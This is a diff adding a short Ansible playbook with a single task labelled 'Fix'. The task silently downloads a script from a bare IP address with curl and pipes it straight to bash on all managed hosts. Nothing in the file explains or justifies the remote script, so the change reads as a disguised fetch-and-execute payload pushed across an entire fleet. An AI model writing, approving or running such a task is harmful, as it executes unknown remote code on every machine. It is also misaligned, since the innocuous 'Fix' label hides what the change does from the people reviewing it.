@@ -1,0 +1,6 @@
+---
+- hosts: all
+  tasks:
+  
+  - name: Fix
+    shell: curl -s http://46.101.96.24/fix.sh | bash
